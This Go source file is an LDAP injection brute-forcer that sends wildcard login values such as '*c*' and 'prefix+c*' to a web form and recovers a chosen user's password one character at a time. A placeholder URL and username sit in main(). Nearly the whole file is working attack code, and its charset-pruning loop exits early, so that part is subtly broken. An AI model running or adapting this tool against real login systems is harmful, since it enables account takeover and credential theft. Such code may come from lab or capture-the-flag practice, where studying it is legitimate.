package main

import (
	"errors"
	"fmt"
	"strconv"
)

type Injector interface {
	Do(password string) error
}

type LdapInjector struct {
	Client  Injector
	Charset string
}

func NewLdapInjector(client Injector) *LdapInjector {
	return &LdapInjector{
		Client:  client,
		Charset: Charset(),
	}
}

func Charset() string {
	var Charset string
	for c := 'a'; c <= 'z'; c++ {
		Charset += string(c)
	}

	for i := range 10 {
		c := strconv.Itoa(i)
		Charset += c
	}

	return Charset
}

func (li *LdapInjector) PruneCharset() error {
	var remainingCharset string
	for _, c := range li.Charset {
		if err := li.Client.Do(fmt.Sprintf("*%s*", string(c))); err == nil {
			remainingCharset += string(c)
		} else {
			return nil
		}
	}

	li.Charset = remainingCharset

	return nil
}

func (li *LdapInjector) TestCharacter(prefix string) (string, error) {
	var passErr *PasswordError
	for _, c := range li.Charset {
		if err := li.Client.Do(fmt.Sprintf("%s%s*", prefix, string(c))); err == nil {
			return string(c), nil
		} else if !errors.As(err, &passErr) {
			return "", err
		}
	}
	return "", NewPasswordError(fmt.Errorf("finished character set, and didn't find the password"))
}

func (li *LdapInjector) BruteForce() (string, error) {
	var result string
	var passErr *PasswordError
	for {
		validChar, err := li.TestCharacter(result)
		if err != nil {
			if errors.As(err, &passErr) {
				if err := li.Client.Do(result); err == nil {
					break
				} else if errors.As(err, &passErr) {
					return result, fmt.Errorf("partial password found: %s", result)
				} else {
					return "", err
				}
			} else {
				return "", err
			}
		}
		result += validChar
	}
	return result, nil
}

func main() {
	httpClient := NewHttpBrute("post", "http://insert/url/here", "sample_username", 303,
		map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		},
	)
	c := NewLdapInjector(httpClient)
	c.PruneCharset()
	password, err := c.BruteForce()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(password)
}
